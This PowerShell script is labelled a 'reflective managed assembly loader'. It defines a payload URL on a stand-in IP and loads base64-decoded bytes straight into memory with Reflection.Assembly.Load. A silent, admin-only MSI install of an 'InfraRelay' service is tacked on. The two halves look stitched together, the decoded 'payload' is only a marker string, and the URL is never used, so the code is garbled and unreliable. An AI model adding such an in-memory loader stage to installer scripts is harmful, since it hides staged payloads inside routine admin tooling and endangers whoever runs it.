
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.203:80/payload.bin",
    [int]$TimeoutSec = 88
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp0ZGYwZ3JyaXUy")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $OperationResult) {
    Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$InstallerPath = "C:\Scripts\packages\InfraRelay-6.0.7.msi"
$ServiceName = 'InfraRelay'
$Port = 9000
$TimeoutSec = 120
$LogPath = "C:\Logs\install-infrarelay-2024-01-24.log"
$RuleName = "InfraRelay Inbound"


$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$process = Start-Process -FilePath 'msiexec.exe' -Wait -PassThru -ArgumentList @('/i', $InstallerPath, '/qn', '/norestart')
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Get-Service -Name $ServiceName | Select-Object Name, Status
